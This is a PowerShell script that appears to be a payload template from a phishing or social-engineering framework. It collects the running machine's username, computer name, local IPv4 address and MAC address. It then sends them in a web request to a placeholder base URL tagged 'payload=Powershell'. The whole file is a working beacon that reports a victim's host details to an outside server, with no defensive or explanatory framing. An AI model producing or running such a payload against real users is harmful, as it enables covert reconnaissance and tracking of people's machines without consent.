function Get-MACAddress {
    param ($strComputer)

    $colItems = get-wmiobject -class "Win32_NetworkAdapterConfiguration" -computername $strComputer |Where{$_.IpEnabled -Match "True"}

    foreach ($objItem in $colItems) {

        $objItem |select MACAddress |ft -hidetableheaders |Out-String

    }
}

$ipaddress = [System.Net.DNS]::GetHostByName($null)
foreach($ip in $ipaddress.AddressList)
{
  if ($ip.AddressFamily -eq 'InterNetwork')
  {
    $localip = $ip.IPAddressToString
  }
}

$macaddress = Get-MACAddress $localip
$localip = $localip.Trim()
$macaddress = $macaddress.Trim()
$computername = $env:computername
$username = $env:username

$base_url = "{{BASE_URL}}"
$link = $base_url + "&username=" + $username + "&computername=" + $computername + "&ip=" + $localip + "&mac=" + $macaddress + "&payload=Powershell"

$response = (New-Object System.Net.WebClient).DownloadString($link)
